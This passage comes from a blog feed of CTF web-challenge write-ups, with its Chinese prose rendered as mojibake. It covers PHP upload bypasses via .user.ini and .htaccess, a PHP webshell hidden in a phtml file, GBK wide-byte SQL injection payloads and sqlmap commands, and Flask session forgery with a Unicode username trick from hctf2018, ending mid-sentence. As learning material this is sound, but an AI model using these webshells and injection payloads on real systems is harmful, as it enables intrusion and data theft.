phpinfo();?&gt;</code></pre><p>è®¿é—®1.jpgï¼Œå½“ä½œphpè§£æ</p><h2>å±€é™</h2>åœ¨.htaccessé…ç½®æ–‡ä»¶åªåœ¨ApacheæœåŠ¡å™¨ä¸­èµ·ä½œç”¨ã€‚<h1>.user.ini</h1>php.iniæ˜¯phpçš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ªwebæœåŠ¡å™¨èµ·ä½œç”¨ï¼›è€Œ.user.iniå’Œ.htaccessä¸€æ ·æ˜¯ç›®å½•çš„é…ç½®æ–‡ä»¶ï¼Œ.user.iniå°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ä¸€ä¸ªphp.ini,é€šå¸¸ç”¨è¿™ä¸ªæ–‡ä»¶æ¥æ„é€ åé—¨å’Œéšè—åé—¨<h2>ç¤ºä¾‹</h2><p>phpé…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªé…ç½®å¯ä»¥èµ·åˆ°ä¸€å®šä½œç”¨</p><pre><code>  auto_prepend_file=&lt;filename&gt; //åŒ…å«åœ¨æ–‡ä»¶å¤´  auto_append_file=&lt;filename&gt;  //åŒ…å«åœ¨æ–‡ä»¶å°¾     // .user.ini auto_prepend_file = 1.jpg  // 1.jpg &lt;?php phpinfo();?&gt; // 11.phpä¹Ÿå°±æ˜¯åœ¨ä¸€ä¸ªç›®å½•ä¸‹æœ‰.user.iniè¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œé…ç½®å†…å®¹ä¸ºä¸Šï¼Œæœ‰1.jpgï¼ŒåŒæ—¶è¯¥ç›®å½•ä¸‹è¿˜éœ€è¦æœ‰.phpåç¼€çš„æ–‡ä»¶ï¼Œauto_prepend_file = 1.jpg è¿™ä¸ªé…ç½®çš„æ„æ€å°±æ˜¯åœ¨å½“å‰ç›®å½•ä¸‹çš„.phpæ–‡ä»¶åŒ…å«1.jpgè¿™ä¸ªå›¾ç‰‡ï¼Œåœ¨æ­¤å¤„ç›¸å½“äºåœ¨11.phpæ–‡ä»¶å¤´æ’å…¥äº† require(&#39;1.jpg&#39;) è¿™æ¡è¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¯´ç›¸å½“äºæ–‡ä»¶åŒ…å«ã€‚</code></pre><p><img src="1.jpg"></p><p><img src="2.jpg"></p><h2>å±€é™</h2>åœ¨.user.iniä¸­ä½¿ç”¨è¿™æ¡é…ç½®ä¹Ÿè¯´æ˜äº†æ˜¯åœ¨åŒç›®å½•ä¸‹çš„å…¶ä»–.phpæ–‡ä»¶ä¸­åŒ…å«é…ç½®ä¸­æ‰€æŒ‡å®šçš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥ç›®å½•ä¸‹å­˜åœ¨.phpæ–‡ä»¶ï¼Œé€šå¸¸åœ¨åœ¨æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼Œä¸€èˆ¬æ˜¯æœ‰ä¸ªä¸“é—¨ç›®å½•æ¥å­˜æ”¾å›¾ç‰‡çš„ï¼Œå¯èƒ½å¾ˆå°çš„æ¦‚ç‡ä¼šå­˜åœ¨.phpæ–‡ä»¶ã€‚<p>ä½†æ˜¯æœ‰æ—¶å¯ä»¥ä½¿ç”¨ ../ æ¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°å…¶ä»–ç›®å½•ï¼Œè¾¾åˆ°ä¸€ä¸ªåˆ©ç”¨çš„æ•ˆæœã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF upload</title>
      <link href="/2021/02/09/upload/"/>
      <url>/2021/02/09/upload/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>è¿™é“é¢˜ï¼Œæˆ‘æœ¬æ¥ä»¥ä¸ºå°±æ˜¯ä¸€ä¸ªå‰ç«¯æœ‰ä¸ªæ£€æŸ¥ï¼Œå› ä¸ºå½“ä¸Šä¼ .phpæ–‡ä»¶çš„æ—¶å€™ï¼Œæ˜¯bpå°±åŠ«ä¸ä½ï¼Œç„¶åæƒ³å°±æ˜¯ï¼Œå› ä¸ºåˆè¯´å¿…é¡»æ˜¯jpgï¼Œpngä¸ºåç¼€çš„ï¼Œæ‰€ä»¥å°±æŠŠ1.phpæ”¹ä¸º1.jpgï¼ŒæˆåŠŸæ‹¦æˆªï¼Œåœ¨bpä¸­æ”¹ä¸º1.phpç»“å°¾çš„ï¼Œå‘ç°è¿˜æ˜¯åç«¯è¿˜æœ‰ä¸€æ¬¡æ£€æŸ¥ï¼Œä»¥.phpç»“å°¾çš„è¿˜æ˜¯å¯ä»¥è¢«æ‹¦æˆªä½çš„ï¼Œæ¢æˆphtmlæ–‡ä»¶æµ‹è¯•ã€‚phtmlæ–‡ä»¶ä»£ç å¦‚ä¸‹</p><pre><code>   GIF89a  //åœ¨æ–‡ä»¶å‰åŠ ä¸ŠGIF89aæ¥ç»•è¿‡PHP getimagesizeçš„æ£€æŸ¥ï¼Œè¿™é“é¢˜ä¸­æœ‰æ— çš†å¯   &lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;ye&#39;]);&lt;/script&gt;   &lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code></pre><p>//phtmlï¼ŒåµŒå…¥äº†phpè„šæœ¬çš„html</p><p>ctfä¸­æ–‡ä»¶ä¸Šä¼ é¢˜ç›®å¸¸ç”¨çš„phpæ‹“å±•åï¼š</p><pre><code>åˆ©ç”¨ä¸­é—´ä»¶è§£ææ¼æ´ç»•è¿‡æ£€æŸ¥ï¼Œå®æˆ˜å¸¸ç”¨ä¸Šä¼ .user.iniæˆ–.htaccesså°†åˆæ³•æ‹“å±•åæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æ%00æˆªæ–­ç»•è¿‡php3æ–‡ä»¶php4æ–‡ä»¶php5æ–‡ä»¶php7æ–‡ä»¶phtmlæ–‡ä»¶phpsæ–‡ä»¶phtæ–‡ä»¶</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å®½å­—èŠ‚æ³¨å…¥</title>
      <link href="/2021/02/09/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/02/09/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><pre><code> åœ¨ä½¿ç”¨phpè¿æ¥æ•°æ®åº“çš„æ—¶å€™ï¼Œå½“è®¾ç½®â€œset character_set_client=gbkâ€æ—¶ä¼šå¯¼è‡´ä¸€ä¸ªç¼–ç é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„å®½å­—èŠ‚ æ³¨å…¥ï¼Œæ³¨å…¥%DF%27çš„æ—¶å€™ï¼Œå³å¯æŠŠ%5cåƒæ‰ï¼Œä¸¾ä¸ªä¾‹å­</code></pre><p><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p><p>å½“æˆ‘ä»¬è¾“å…¥id=1â€™ and 1=1%23,æŸ¥è¯¢è¯­å¥æ˜¯select id,title from news where id = â€˜2&#39; or 1=1#â€™ï¼Œæ˜¾ç„¶&#39;è¢«è½¬ä¹‰ï¼Œä¸èƒ½å‘æŒ¥é—­åˆä½œç”¨ã€‚ä½†å¦‚æœæˆ‘ä»¬è¾“å…¥id=2%dfâ€™ or 1=1 %23,æŸ¥è¯¢è¯­å¥ä¸ºâ€™2ç¶…â€™ or 1=1 #â€™ï¼Œæ˜¾ç„¶ç°åœ¨è¿™ä¸ªâ€™æœªè¢«è½¬ä¹‰ï¼Œå¯ä»¥å‘æŒ¥å…¶è‡ªèº«ä½œç”¨ã€‚</p><pre><code>  å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨äº†mysqlä¸€ä¸ªç‰¹æ€§ï¼Œmysqlåœ¨ä½¿ç”¨gbkåœ¨è¿›è¡Œç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—èŠ‚æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiçš„ç¼–ç   è¦å¤§äº128ï¼Œè¾¾åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚è¿™å°±æ˜¯mysqlçš„ç‰¹æ€§ï¼Œå› ä¸ºgbkæ˜¯å­—èŠ‚ç¼–ç ï¼Œä»–è®¤ä¸ºä¸¤ä¸ªå­—èŠ‚ä»£è¡¨ä¸€ä¸ªæ±‰å­—ï¼Œæ‰€ä»¥%dfå’Œåé¢   çš„\ä¹Ÿå°±æ˜¯%5cä¸­å˜æˆäº†ä¸€ä¸ªæ±‰å­—â€œè¿â€ï¼Œè€Œé€ƒé€¸äº†å‡ºæ¥ã€‚</code></pre><p>å°±ç›´æ¥æ‰‹å·¥æ³¨å…¥<br></p><li>id=%df%27%20union%20select%201,%20database()%23<li>id=%df%27 union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()%23<li>id=%df' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23<pre><code> çˆ†å­—æ®µçš„æ—¶å€™ï¼Œwhere table_name=&quot;ctf4&quot;,è¿™é‡Œè¿˜æ˜¯æ¶‰åŠäº†è½¬ä¹‰ï¼Œå¦‚æœä¸ç”¨â€œâ€ä¹Ÿæ˜¯ä¼šå‡ºç°æŠ¥é”™çš„ï¼Œæ„Ÿè§‰å› ä¸ºè¿™ä¸ªåº”è¯¥æ˜¯å­—ç¬¦ ä¸²æ˜¯è¦å¸¦&#39;&#39;ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨ä¼ æ¢æˆ16è¿›åˆ¶çš„æ–¹æ³•ï¼Œ0x63746634ï¼Œå› ä¸ºmysqlæ•°æ®åº“æ˜¯é»˜è®¤è®¤è¯†16è¿›åˆ¶çš„ï¼Œä¼šå°†å…¶ä½œä¸ºå­—ç¬¦ä¸² è¯»å…¥.</code></pre><h1>ä¸»è¦è¿˜æ˜¯æƒ³å­¦ä¹ ä¸€ä¸‹sqlmapæ³¨å…¥</h1><li>python sqlmap.py -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes --dbs<br>è¿™é‡Œè¿ç”¨äº†ä¸€ä¸ªè„šæœ¬ï¼Œunmagicquotesï¼Œç”¨äºå®½å­—ç¬¦ç»•è¿‡ã€‚<p><img src="1.png"></p><li>python sqlmap.py -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D `sae-chinalover` --tables<p><img src="2.png"></p><li>python sqlmap.py -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D `sae-chinalover` -T ctf4 --columns<p><img src="3.png"></p><li>python sqlmap.py -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D `sae-chinalover` -T ctf4 -C flag]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hctf2018 admin</title>
      <link href="/2021/02/08/admin/"/>
      <url>/2021/02/08/admin/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>åˆæ˜¯ä¸€é¡¹å¤§å·¥ç¨‹</p><span id="more"></span><p>çœ‹äº†ä¸€ä¸‹æœ‰loginï¼Œregisterï¼Œpostsï¼ˆå‘postï¼‰ï¼Œchenge passwordï¼Œlogoutã€‚ç„¶åæ³¨å†Œçš„æ—¶å€™ï¼Œæˆ‘è¯•äº†ä¸‹adminï¼Œè¯´æ˜¯è¿™ä¸ªadminï¼Œå·²ç»è¢«æ³¨å†Œè¿‡äº†ï¼Œå¹¶ä¸”æ³¨é‡Šäº†ä¹Ÿæœ‰è¯´ï¼Œä½ ä¸æ˜¯adminã€‚ç„¶åæˆ‘æ˜¯æƒ³ï¼ŒæŠŠadminæ‰€å¯¹åº”çš„å¯†ç çˆ†å‡ºæ¥ï¼Œä½†æ˜¯æ²¡æˆåŠŸï¼Œå°±æ²¡åŠæ³•äº†ã€‚åº”è¯¥ä¸åƒæ˜¯ä¸‡èƒ½å¯†ç ä¹‹ç±»çš„ã€‚<br>å“¦ï¼Œä¸æ˜¯çˆ†ä¸å‡ºæ¥ï¼Œæ˜¯å¯†ç å­—å…¸ä¸è¡Œï¼Œå¯†ç 123ï¼Œç™»ä¸Šå»å°±ç›´æ¥å‡ºæ¥flag<br><br>çœ‹wp<br><br>å› ä¸ºæœ‰change passwordçš„åŠŸèƒ½ï¼Œå¯èƒ½å¯ä»¥é€šè¿‡ä¿®æ”¹å¯†ç çš„åŠŸèƒ½æ”¹æ‰adminçš„å¯†ç ï¼Œç„¶åä»¥adminç™»å½•ã€‚åœ¨change passwordçš„æºä»£ç å¤„ï¼Œå‘ç°æœ‰ä¸€ä¸ª<a href="https://github.com/woadsl1234/hctf_flask/%EF%BC%8C">https://github.com/woadsl1234/hctf_flask/ï¼Œ</a><br><br>è¿™æ˜¯ä¸€ä¸ªflaské¡¹ç›®ï¼Œä»£ç ç»“æ„ç®€å•å¦‚ä¸‹å›¾ã€‚</p><p><img src="1.jpg"></p><p>flaské¡¹ç›®ï¼Œå°±å…ˆå»è·¯ç”±å»çœ‹ä¸€ä¸‹ï¼Œæ‰“å¼€route.py,çœ‹ä¸€ä¸‹indexçš„æ³¨å†Œå‡½æ•°ä»£ç ã€‚</p><pre><code> @app.route(&#39;/&#39;)@app.route(&#39;/index&#39;)def index():return render_template(&#39;index.html&#39;, title = &#39;hctf&#39;)</code></pre><p>å‘ç°indexçš„æ³¨å†Œç æ²¡æœ‰åšä»€ä¹ˆå¤„ç†ï¼Œé‚£å°±ç›´æ¥è¿”å›index.htmlæ¸²æŸ“æ¨¡æ¿ï¼Œäºæ˜¯æˆ‘ä»¬çœ‹ä¸€ä¸‹templates/index.htmlä»£ç ã€‚</p><pre><code>&#123;% include('header.html') %&#125;&#123;% if current_user.is_authenticated %&#125;    <h1 class="nav">Hello &#123;&#123; session['name'] &#125;&#125;</h1>    &#123;% endif %&#125;&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;    <h1 class="nav">hctf&#123;xxxxxxxxx&#125;</h1>    &#123;% endif %&#125;&lt;!-- you are not admin --&gt;&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;&#123;% include('footer.html') %&#125;</code></pre><p>ä»ä¸Šè¿°ä»£ç å¯ä»¥çœ‹å‡ºï¼Œåªæœ‰ç™»å½•adminæ‰å¯ä»¥å¾—åˆ°flagã€‚äºæ˜¯ç»§ç»­çœ‹å‘route.pyæ–‡ä»¶ï¼Œçœ‹çœ‹loginå’Œchange passwordåœ°æ³¨å†Œå‡½æ•°å˜›æ˜¯æ€ä¹ˆå†™çš„ã€‚route,pyéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p><pre><code>   @app.route(&#39;/register&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])</code></pre><p>def register():</p><pre><code>if current_user.is_authenticated:    return redirect(url_for(&#39;index&#39;))form = RegisterForm()if request.method == &#39;POST&#39;:    name = strlower(form.username.data)    if session.get(&#39;image&#39;).lower() != form.verify_code.data.lower():        flash(&#39;Wrong verify code.&#39;)        return render_template(&#39;register.html&#39;, title = &#39;register&#39;, form=form)    if User.query.filter_by(username = name).first():        flash(&#39;The username has been registered&#39;)        return redirect(url_for(&#39;register&#39;))    user = User(username=name)    user.set_password(form.password.data)    db.session.add(user)    db.session.commit()    flash(&#39;register successful&#39;)    return redirect(url_for(&#39;login&#39;))return render_template(&#39;register.html&#39;, title = &#39;register&#39;, form = form)@app.route(&#39;/login&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])def login():if current_user.is_authenticated:    return redirect(url_for(&#39;index&#39;))form = LoginForm()if request.method == &#39;POST&#39;:    name = strlower(form.username.data)    session[&#39;name&#39;] = name    user = User.query.filter_by(username=name).first()    if user is None or not user.check_password(form.password.data):        flash(&#39;Invalid username or password&#39;)        return redirect(url_for(&#39;login&#39;))    login_user(user, remember=form.remember_me.data)    return redirect(url_for(&#39;index&#39;))return render_template(&#39;login.html&#39;, title = &#39;login&#39;, form = form)@app.route(&#39;/logout&#39;)def logout():logout_user()return redirect(&#39;/index&#39;)@app.route(&#39;/change&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])def change():if not current_user.is_authenticated:    return redirect(url_for(&#39;login&#39;))form = NewpasswordForm()if request.method == &#39;POST&#39;:    name = strlower(session[&#39;name&#39;])    user = User.query.filter_by(username=name).first()    user.set_password(form.newpassword.data)    db.session.commit()    flash(&#39;change successful&#39;)    return redirect(url_for(&#39;index&#39;))return render_template(&#39;change.html&#39;, title = &#39;change&#39;, form = form)</code></pre><h1>è§£æ³•ä¸€â€”â€”â€”â€”flask sessionä¼ªé€ </h1><p>flaskçš„sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯cookieä¸­çš„ï¼Œè€Œä¸”flaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²æ­¢ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶æ‰€æœ‰çš„sessionçš„å†…å®¹æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¢«è¯»å–çš„ï¼Œè¿™ä¹Ÿå¯ä»¥é€ æˆä¸€äº›å®‰å…¨é—®é¢˜ã€‚<br>æˆ‘ä»¬å¯ä»¥ç”¨pythonè„šæœ¬æŠŠflaskçš„sessionæ­ç§˜å‡ºæ¥ï¼Œä½†æ˜¯å¦‚æœæƒ³è¦åŠ å¯†æˆè‡ªå·±çš„sessionçš„è¯ï¼Œè¿˜éœ€è¦çŸ¥é“flaskç”¨æ¥ç­¾åçš„<mark>secret_key</mark>,åœ¨githubä¸­æ‰¾ï¼Œå¯ä»¥åœ¨config.pyé‡Œå‘ç°ä¸‹é¢ä»£ç </p><pre><code>   import osclass Config(object):SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;SQLALCHEMY_DATABASE_URI = &#39;mysql+pymysql://root:adsl1234@db:3306/test&#39;SQLALCHEMY_TRACK_MODIFICATIONS = True</code></pre><p>ä¼°è®¡ckj123å°±æ˜¯secret_keyï¼Œæ‰€ä»¥sessionä¼ªé€ è¿™æ¡è·¯å¯ä»¥èµ°ï¼Œäºæ˜¯åœ¨githubä¸Šæ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰flask sessionåŠ å¯†çš„è„šæœ¬ã€‚</p><p><img src="2.jpg"></p><p>æŠŠè„šæœ¬downä¸‹æ¥ï¼Œç„¶åæ‰§è¡Œï¼Œè„šæœ¬ä»£ç å¦‚ä¸‹ã€‚</p><pre><code>flask_session_manager.py   &quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;__author__ = &#39;Wilson Sumanang, Alexandre ZANNI&#39;# standard importsimport sysimport zlibfrom itsdangerous import base64_decodeimport ast# Abstract Base Classes (PEP 3119)if sys.version_info[0] &lt; 3: # &lt; 3.0raise Exception(&#39;Must be using at least Python 3&#39;)elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4from abc import ABCMeta, abstractmethodelse: # &gt; 3.4from abc import ABC, abstractmethod # Lib for argument parsingimport argparse# external Importsfrom flask.sessions import SecureCookieSessionInterfaceclass MockApp(object):def __init__(self, secret_key):    self.secret_key = secret_keyif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4class FSCM(metaclass=ABCMeta):    def encode(secret_key, session_cookie_structure):        &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;        try:            app = MockApp(secret_key)            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))            si = SecureCookieSessionInterface()            s = si.get_signing_serializer(app)            return s.dumps(session_cookie_structure)        except Exception as e:            return &quot;[Encoding error] &#123;&#125;&quot;.format(e)            raise e    def decode(session_cookie_value, secret_key=None):        &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;        try:            if(secret_key==None):                compressed = False                payload = session_cookie_value                if payload.startswith(&#39;.&#39;):                    compressed = True                    payload = payload[1:]                data = payload.split(&quot;.&quot;)[0]                data = base64_decode(data)                if compressed:                    data = zlib.decompress(data)                return data            else:                app = MockApp(secret_key)                si = SecureCookieSessionInterface()                s = si.get_signing_serializer(app)                return s.loads(session_cookie_value)        except Exception as e:            return &quot;[Decoding error] &#123;&#125;&quot;.format(e)            raise eelse: # &gt; 3.4class FSCM(ABC):    def encode(secret_key, session_cookie_structure):        &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;        try:            app = MockApp(secret_key)            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))            si = SecureCookieSessionInterface()            s = si.get_signing_serializer(app)            return s.dumps(session_cookie_structure)        except Exception as e:            return &quot;[Encoding error] &#123;&#125;&quot;.format(e)            raise e    def decode(session_cookie_value, secret_key=None):        &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;        try:            if(secret_key==None):                compressed = False                payload = session_cookie_value                if payload.startswith(&#39;.&#39;):                    compressed = True                    payload = payload[1:]                data = payload.split(&quot;.&quot;)[0]                data = base64_decode(data)                if compressed:                    data = zlib.decompress(data)                return data            else:                app = MockApp(secret_key)                si = SecureCookieSessionInterface()                s = si.get_signing_serializer(app)                return s.loads(session_cookie_value)        except Exception as e:            return &quot;[Decoding error] &#123;&#125;&quot;.format(e)            raise eif __name__ == &quot;__main__&quot;:# Args are only relevant for __main__ usage## Description for helpparser = argparse.ArgumentParser(            description=&#39;Flask Session Cookie Decoder/Encoder&#39;,            epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)## prepare sub commandssubparsers = parser.add_subparsers(help=&#39;sub-command help&#39;, dest=&#39;subcommand&#39;)## create the parser for the encode commandparser_encode = subparsers.add_parser(&#39;encode&#39;, help=&#39;encode&#39;)parser_encode.add_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar=&#39;&lt;string&gt;&#39;,                            help=&#39;Secret key&#39;, required=True)parser_encode.add_argument(&#39;-t&#39;, &#39;--cookie-structure&#39;, metavar=&#39;&lt;string&gt;&#39;,                            help=&#39;Session cookie structure&#39;, required=True)## create the parser for the decode commandparser_decode = subparsers.add_parser(&#39;decode&#39;, help=&#39;decode&#39;)parser_decode.add_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar=&#39;&lt;string&gt;&#39;,                            help=&#39;Secret key&#39;, required=False)parser_decode.add_argument(&#39;-c&#39;, &#39;--cookie-value&#39;, metavar=&#39;&lt;string&gt;&#39;,                            help=&#39;Session cookie value&#39;, required=True)## get argsargs = parser.parse_args()## find the option chosenif(args.subcommand == &#39;encode&#39;):    if(args.secret_key is not None and args.cookie_structure is not None):        print(FSCM.encode(args.secret_key, args.cookie_structure))elif(args.subcommand == &#39;decode&#39;):    if(args.secret_key is not None and args.cookie_value is not None):        print(FSCM.decode(args.cookie_value,args.secret_key))    elif(args.cookie_value is not None):        print(FSCM.decode(args.cookie_value))</code></pre><p>è„šæœ¬æœ‰è§£å¯†åŠ å¯†çš„ä½œç”¨ï¼Œå…·ä½“ç”¨æ³•å¦‚ä¸‹ï¼š</p><li>è§£å¯†ï¼špython flask_session_manager.py decode -c -s #-cæ˜¯cookieé‡Œçš„sessionçš„å€¼ï¼Œ -sæ˜¯SECRET-KEY<li>åŠ å¯†ï¼špython flask_session_manager.py encode -s -t #-sæ˜¯SECRET-KEYï¼Œ-tæ˜¯sessionçš„å‚ç…§æ ¼å¼ï¼Œä¹Ÿæ˜¯sessionè§£å¯†åçš„æ ¼å¼<p>æˆ‘ä»¬æŠŠç™»å½•é¡µé¢çš„cookieä¸­çš„sessionå¤åˆ¶ä¸‹æ¥ï¼š</p><pre><code>  .eJw9j0FrwkAQhf9K2XMPZmMugofCakhgJmxYXWYvoqlNMnEstIXEFf97QwveHnyPj_fu6tC_q9VdvZzUSqGHDOMmBtl2IFYjFxH8bkJNsXJNSq6YUGCJhib0pVSm7IOxY3Ado-kuxNhXeT1nSpH3Ambu5nALbBfAkJAUGiIOFJsxcDmAFCnp0AVnR8y3HMzmBgYFtZ3QNAmwXYKDSH6XAZcMPGjgWoCbtXq8qub76-Pw8zmcr88LYEgTtxHy0FF8y2ieUfndAuYcZH8JOd1I6gFdm5KnGJgyGNd_ul6O7flp8vttQvafXI8yA5Woxy_gZmLE.YCEcrA.rHKFgybomMZRkOtrUtERWPlSF9M</code></pre><p>è§£å‡ºæ¥æ˜¯</p><pre><code> &#123;&#39;_id&#39;: b&#39;5c9713faa2d66231e17f3977a216c84615bf82bd40e8c48eb3b8dc46765f0384c2f44235bb633dc70f2d2b7cfae404acd1203f7d1475248133ae922c29624f27&#39;, &#39;csrf_token&#39;: b&#39;066b830fac09b5f9e4309feedf2bdd587af3f693&#39;, &#39;image&#39;: b&#39;YQua&#39;, &#39;name&#39;: &#39;1&#39;&#125;</code></pre><p>ç„¶åå°†name:åé¢çš„1æ”¹ä¸ºadminï¼Œè¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°sessionã€‚</p><pre><code> .eJw9j0Frg0AQhf9K2XMPcY2XQA6FTURhRlZMltlLSE2qjhkLbUHdkP9eaSG3B9_j4727OnUXtbmrl3e1UeggwbALXvYtiNXIWQB3mFBTKKo6piqbUGCNhiZ0uRQm77yxo69aRtPeiLEr0nLJFCMfBczSTWH2bFfAEJFkGgL2FOrRc96DZDFp3_rKjpju2ZvdDAYFtZ3Q1BGwXUMFgdwhAc4ZuNfApQDXW_V4VfX318fp57O_Ds8LYEgTNwFS31J4S2iZUbjDCpbs5XjzKc0kZY9VE5Oj4JkSGLd_uk7OzfVpcsd9RPafDGdZgDpfpBvU4xdxz2Sc.YCEm7Q.qff8PxWgZCxrPTSvX8vQa94gv_0</code></pre><p>åé¢åº”è¯¥å°±æ˜¯æ”¹cookieï¼Œä½†æ˜¯ï¼Œæˆ‘æ²¡æœ‰æˆåŠŸã€‚å¾ˆæ˜¯iå¥‡æ€ª</p><h1>unicodeæ¬ºéª—</h1>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œä¸ç®¡æ˜¯loginï¼Œregisterè¿˜æ˜¯changeé¡µé¢ï¼Œåªè¦æ˜¯å…³äºsessionã€â€œnameâ€ã€‘çš„æ“ä½œï¼Œéƒ½ä¼šå…ˆç”¨strlowerå‡½æ•°å°†nameè½¬æˆå°å†™ï¼Œä½†æ˜¯pythoné‡Œæœ‰è‡ªå¸¦çš„è½¬å°å†™çš„å‡½æ•°lowerï¼Œè¿™é‡Œé‡å†™äº†ä¸€ä¸ªï¼Œå¯èƒ½æœ‰çŒ«è…»ï¼Œäºæ˜¯æ‰¾åˆ°äº†strlowerå‡½æ•°çš„å®šä¹‰ã€‚<pre><code>    def strlower(username):username = nodeprep.prepare(username)return username</code></pre><p>è¿™é‡Œç”¨åˆ°äº†nodeprep.prepareå‡½æ•°ï¼Œè€Œnodeprepæ˜¯ä»twistedæ¨¡å—ä¸­å¯¼å…¥çš„from twisted.words.protocols.jabber.xmpp_stringprep import nodeprepï¼Œåœ¨requirements.txtæ–‡ä»¶ä¸­ï¼Œå‘ç°è¿™é‡Œç”¨åˆ°çš„twistedç‰ˆæœ¬æ˜¯Twisted==10.2.0ï¼Œè€Œå®˜ç½‘æœ€æ–°ç‰ˆæœ¬ä¸º19.2.0(2019/6/2)ï¼Œç‰ˆæœ¬å·®è·è¿™ä¹ˆå¤§ï¼Œä¼°è®¡æ˜¯å­˜åœ¨ä»€ä¹ˆæ¼æ´ï¼Œäºæ˜¯æœç´¢ä¸€ä¸‹nodeprep.prepareï¼Œæ‰¾åˆ°ä¸€ç¯‡unicodeå®‰å…¨çš„æ–‡ç« ï¼Œ<a href="https://paper.tuisec.win/detail/a9ad1440249d95b">https://paper.tuisec.win/detail/a9ad1440249d95b</a></p><p>è¿™é‡ŒåŸç†å°±æ˜¯åˆ©ç”¨nodeprep.prepareå‡½æ•°ä¼šå°†unicodeå­—ç¬¦á´¬è½¬æ¢æˆAï¼Œè€ŒAåœ¨è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ä¼šæŠŠAè½¬æ¢æˆaã€‚<br>æ‰€ä»¥å½“æˆ‘ä»¬ç”¨á´¬dminæ³¨å†Œçš„è¯ï¼Œåå°ä»£ç è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ï¼ŒæŠŠç”¨æˆ·åè½¬æ¢æˆAdminï¼Œæˆ‘ä»¬ç”¨á´¬dminè¿›è¡Œç™»å½•ï¼Œå¯ä»¥çœ‹åˆ°indexé¡µé¢çš„usernameå˜æˆäº†Adminï¼Œè¯å®äº†æˆ‘ä»¬çš„çŒœæƒ³ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±æƒ³åŠæ³•è®©æœåŠ¡å™¨å†è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°å³å¯ã€‚</p><p>æˆ‘ä»¬å‘ç°åœ¨æ”¹å¯†ç å‡½æ•°ä»£ç 